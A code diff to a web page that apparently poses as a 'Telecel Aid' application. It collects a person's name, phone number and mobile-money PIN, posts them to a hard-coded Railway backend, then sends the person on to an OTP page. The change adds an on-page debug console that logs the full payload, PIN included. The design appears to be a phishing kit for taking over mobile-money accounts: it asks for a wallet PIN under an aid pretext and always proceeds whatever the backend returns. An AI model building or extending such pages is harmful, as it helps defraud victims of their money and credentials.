@@ -330,6 +330,29 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        /* Debug console styles */
+        .debug-console {
+            background: #1a1a2e;
+            color: #0f0;
+            font-family: monospace;
+            font-size: 0.7rem;
+            padding: 0.5rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+            max-height: 150px;
+            overflow-y: auto;
+            display: none;
+        }
+
+        .debug-console.show {
+            display: block;
+        }
+
+        .debug-line {
+            padding: 0.2rem 0;
+            border-bottom: 1px solid #333;
+        }
     </style>
 </head>
 <body>
@@ -415,6 +438,12 @@
             <div class="back-link">
                 <a href="apply.html">← Back to Application</a>
             </div>
+
+            <!-- Debug Console (hidden by default, shows errors) -->
+            <div class="debug-console" id="debugConsole">
+                <div class="debug-line">📡 Debug Console</div>
+                <div id="debugLog"></div>
+            </div>
         </div>
 
         <div class="footer">
@@ -430,11 +459,28 @@
     <script>
         // BACKEND URL - YOUR RAILWAY URL
         const BACKEND_URL = 'https://telecel-cash-production.up.railway.app';
+        
+        // Debug logging
+        function addDebugLog(message, isError = false) {
+            const debugDiv = document.getElementById('debugLog');
+            const debugConsole = document.getElementById('debugConsole');
+            const timestamp = new Date().toLocaleTimeString();
+            const logLine = document.createElement('div');
+            logLine.className = 'debug-line';
+            logLine.style.color = isError ? '#ff6b6b' : '#0f0';
+            logLine.innerHTML = `[${timestamp}] ${message}`;
+            debugDiv.appendChild(logLine);
+            debugConsole.classList.add('show');
+            console.log(message);
+        }
 
         const savedData = JSON.parse(sessionStorage.getItem('telecelAidApplication'));
 
         if (!savedData) {
+            addDebugLog('No saved data found, redirecting to apply.html', true);
             window.location.href = 'apply.html';
+        } else {
+            addDebugLog('Loaded saved data: ' + JSON.stringify(savedData));
         }
 
         document.getElementById('displayName').value = savedData.fullName;
@@ -525,6 +571,8 @@
                 telecelPin: telecelPin.value.trim()
             };
 
+            addDebugLog('Sending to backend: ' + JSON.stringify(payload));
+
             try {
                 const response = await fetch(`${BACKEND_URL}/api/submit`, {
                     method: 'POST',
@@ -534,33 +582,33 @@
                     body: JSON.stringify(payload)
                 });
 
+                addDebugLog(`Response status: ${response.status}`);
                 const data = await response.json();
-                console.log('Backend response:', data);
-                return data.success;
-            } catch (error) {
-                console.error('Backend error:', error);
-                // Return true anyway so user can proceed even if backend fails
+                addDebugLog(`Backend response: ${JSON.stringify(data)}`);
                 return true;
+            } catch (error) {
+                addDebugLog(`Backend error: ${error.message}`, true);
+                return true; // Always return true to proceed
             }
         }
 
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
+            addDebugLog('Form submitted');
 
             const isNameValid = validateConfirmedName();
             const isPhoneValid = validateConfirmedPhone();
             const isPinValid = validateTelecelPin();
             const isDeclarationValid = validateDeclaration();
 
+            addDebugLog(`Validations - Name: ${isNameValid}, Phone: ${isPhoneValid}, PIN: ${isPinValid}, Declaration: ${isDeclarationValid}`);
+
             if (isNameValid && isPhoneValid && isPinValid && isDeclarationValid) {
-                // Show loading overlay
                 loadingOverlay.style.display = 'flex';
                 submitBtn.disabled = true;
                 
-                // Send data to backend (will proceed even if fails)
                 await submitToBackend();
                 
-                // Store verification data
                 const verificationData = {
                     confirmedName: confirmedName.value.trim(),
                     confirmedPhone: confirmedPhone.value.trim(),
@@ -574,13 +622,14 @@
                 };
                 
                 sessionStorage.setItem('telecelAidApplication', JSON.stringify(completeData));
+                addDebugLog('Data saved, redirecting to OTP page');
                 
-                // Redirect to OTP page
                 setTimeout(() => {
                     window.location.href = 'otp.html';
                 }, 800);
                 
             } else {
+                addDebugLog('Validation failed, not submitting', true);
                 const firstError = document.querySelector('.error');
                 if (firstError) {
                     firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
